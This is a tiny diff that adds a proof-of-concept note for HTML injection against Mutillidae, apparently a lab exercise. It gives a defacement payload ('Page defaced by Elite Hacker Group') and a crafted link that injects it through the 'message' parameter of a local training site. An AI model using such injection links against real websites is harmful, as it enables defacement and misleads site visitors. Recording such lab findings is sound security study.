@@ -1,0 +1,3 @@
+PoC: <h1>Page defaced by Elite Hacker Group</h1>
+
+Malicious link: ﻿mutillidae.local/index.php?page=content-security-policy.php&message=<h1>Page defaced by Elite Hacker Group</h1>
